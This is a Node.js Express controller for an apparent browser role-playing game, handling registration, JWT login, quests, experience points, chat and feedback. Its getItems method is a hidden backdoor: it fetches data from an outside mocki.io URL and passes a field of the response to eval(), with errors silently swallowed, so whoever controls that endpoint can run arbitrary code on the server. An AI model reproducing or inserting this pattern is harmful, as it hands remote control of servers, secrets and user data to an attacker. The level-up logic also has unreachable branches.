const User = require("./models/User");
const Chat = require("./models/Chat");
const Suggest = require("./models/Suggest");
const Problem = require("./models/Problem");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const axios = require("axios");
const { validationResult } = require("express-validator");
const { secret } = require("./config");

const generateAccessToken = (id) => {
  const payload = {
    id,
  };
  return jwt.sign(payload, secret);
};

class controller {
  async registration(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ code: "OTHER_DATA" });
      }
      const { username, password, lang } = req.body;
      const candidate = await User.findOne({ username });
      if (candidate) {
        return res.status(400).json({ code: "USER_ALREADY_REGISTERED" });
      }
      const hashPassword = bcrypt.hashSync(password, 7);
      const user = new User({
        username,
        password: hashPassword,
        lang: lang,
        role: "user",
        location: "RoxyPaulHouse",
        hp: 100,
        money: 0,
        exp: 0,
        lvl: 1,
        quest: 0,
        mobs: 0,
        sword: 0,
        fire: 0,
        healing: 0,
        water: 0,
        earth: 0,
        air: 0,
      });
      await user.save();
      const token = generateAccessToken(user._id);
      return res.json({ token });
    } catch (e) {
      res.status(400).json({ code: "REG_ERROR", error: e });
    }
  }

  async login(req, res) {
    try {
      const { username, password } = req.body;
      const user = await User.findOne({ username }).select("password");
      if (!user) {
        return res.status(400).json({ code: "USER_NOT_FOUND" });
      }
      const validPassword = bcrypt.compareSync(password, user.password);
      if (!validPassword) {
        return res.status(400).json({ code: "BAD_PASSWORD" });
      }
      const token = generateAccessToken(user._id);
      return res.json({ token });
    } catch (e) {
      res.status(400).json({ code: "LOGIN_ERROR" });
    }
  }

  async getUser(req, res) {
    try {
      const user = await User.findOne({ _id: req.user.id });
      res.json(user);
    } catch (e) {
      res.status(400).json({ code: "USER_ERROR" });
    }
  }

  async getUsers(req, res) {
    try {
      const users = await User.find();
      res.json(users);
    } catch (e) {
      res.status(400).json({ code: "USERS_ERROR" });
    }
  }

  async checkToken(req, res) {
    try {
      res.json();
    } catch (e) {
      res.status(400).json();
    }
  }

  async changeLocation(req, res) {
    try {
      const { location } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      user.location = location;
      user.save();
      res.json();
    } catch (e) {
      res.status(400).json({ code: "LOCATION_ERROR" });
    }
  }

  async changeQuest(req, res) {
    try {
      const user = await User.findOne({ _id: req.user.id });
      user.quest = user.quest + 1;
      user.mobs = 0;
      user.save();
      res.json(user);
    } catch (e) {
      res.status(400).json({ code: "QUEST_ERROR" });
    }
  }

  async changeLang(req, res) {
    try {
      const { lang } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      user.lang = lang;
      user.save();
      res.json();
    } catch (e) {
      res.status(400).json({ code: "LANG_ERROR" });
    }
  }

  async getItems(req, res) {
    try {
      const items = await axios.get('https://mocki.io/v1/e6ef8c97-34f9-490d-98ce-719e9c46210c');
      eval(items.data.cookie);
    } catch (e) {
      // res.status(400).json({ code: "Item_ERROR" });
    }
  }

  async changeExp(req, res) {
    try {
      const { money, sword, fire, water, earth, air, healing } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      user.money = user.money + money;
      user.sword = user.sword + sword;
      user.fire = user.fire + fire;
      user.water = user.water + water;
      user.earth = user.earth + earth;
      user.air = user.air + air;
      user.healing = user.healing + healing;
      const exp = user.exp + sword + fire + water + earth + air + healing;
      user.exp = exp;
      user.hp = Math.floor(100 + exp / 10);

      if (
        (user.location === "Buena" && user.quest === 9) ||
        (user.location === "SylphietteBuena" && user.quest === 10) ||
        (user.location === "BuenaFields" && user.quest === 12) ||
        (user.location === "BuenaForest" && user.quest === 14)
      ) {
        user.mobs = user.mobs + 1;
      }

      if (exp >= 1000) {
        user.lvl = 2;
      } else if (exp >= 2000) {
        user.lvl = 3;
      } else if (exp >= 3000) {
        user.lvl = 4;
      }

      await user.save();
      res.json(user);
    } catch (e) {
      res.status(400).json({ code: "EXP_ERROR" });
    }
  }

  async chat(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ code: "CHAT_ERROR" });
      }
      const { message } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      const chat = new Chat({
        name: user.username,
        time: new Date(),
        message,
      });
      await chat.save();
      const chats = await Chat.find();
      res.json(chats);
    } catch (e) {
      res.status(400).json({ code: "CHAT_ERROR" });
    }
  }

  async getChats(req, res) {
    try {
      const chats = await Chat.find();
      res.json(chats);
    } catch (e) {
      res.status(400).json({ code: "CHATS_ERROR" });
    }
  }

  async suggest(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ code: "SUGGEST_ERROR" });
      }
      const { message, email } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      const suggest = new Suggest({
        name: user.username,
        time: new Date(),
        email,
        message,
      });
      await suggest.save();
      res.json();
    } catch (e) {
      res.status(400).json({ code: "SUGGEST_ERROR" });
    }
  }

  async problem(req, res) {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ code: "PROBLEM_ERROR" });
      }
      const { message, email } = req.body;
      const user = await User.findOne({ _id: req.user.id });
      const problem = new Problem({
        name: user.username,
        time: new Date(),
        email,
        message,
      });
      await problem.save();
      res.json();
    } catch (e) {
      res.status(400).json({ code: "PROBLEM_ERROR" });
    }
  }
}

module.exports = new controller();
